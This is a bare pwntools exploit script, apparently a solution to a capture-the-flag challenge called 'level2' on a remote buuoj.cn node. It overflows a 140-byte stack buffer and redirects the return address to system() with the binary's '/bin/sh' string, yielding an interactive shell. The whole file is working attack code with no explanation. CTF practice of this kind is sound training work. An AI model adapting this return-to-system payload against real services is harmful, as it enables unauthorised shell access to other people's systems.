from pwn import *

context.binary = exe = ELF('./level2')
pop_edi = 0x0804851a


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdbscript='''
                   b*vulnerable_function+47
                   c
                ''')
    else:
        r = remote("node4.buuoj.cn", 29879)
    return r


def main():
    r = conn()
    input()
    payload = b'a' * 140
    payload += p32(exe.sym['system'])
    payload += p32(exe.sym['system']) + p32(next(exe.search(b'/bin/sh')))

    r.sendlineafter(b'Input:\n', payload)
    r.interactive()


if __name__ == "__main__":
    main()
